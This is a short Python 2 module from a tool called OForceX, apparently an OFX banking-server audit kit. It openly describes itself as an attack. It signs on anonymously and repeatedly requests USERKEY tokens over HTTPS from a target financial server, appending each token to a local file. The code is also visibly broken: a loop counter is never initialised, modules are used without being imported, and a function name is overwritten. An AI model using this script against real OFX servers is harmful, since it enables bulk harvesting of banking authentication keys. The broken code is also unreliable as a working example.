#!/usr/bin/python
#
# audit_anon_auth.py
#
# A portion of OForceX
# Written by Antimoon
#
from ofxbody import body_builder

def attack(keyfile='userkeys', attacklen=1000):
    '''This attack module leverages the genuserkey function to harvest 
       a large number of userkeys'''

    signon_var_dict_0 = config_handler.gen_dict('signon')

    signon_var_dict_0['userid']   = 'anonymous00000000000000000000000' 
    signon_var_dict_0['userpass'] = 'anonymous00000000000000000000000'

    body_builder.build(signon_var_dict=signon_var_dict_0)

    try:
        while i <= attacklen:
            ofxbody        = ofx_body_builder()
            ofxheaders     = ofxheaders()
            content_length = str(len(ofxheaders+ofxbody))
            httpheaders    = header_builder(path, httphost, content_length)
            requestfull    = httpheaders + ofxheaders + ofxbody
            out            = http_request(httphost, requestfull, ssl=True, port=443)
            key            = out.split('<USERKEY>')[1].split('</USERKEY>')[0]

            file = open(keyfile, "a")
            file.write(key)
            file.close()

            i+=1

        sys.exit(0)

    except Exception, e:
        print '[!] Error %s' % e
        sys.exit(1)
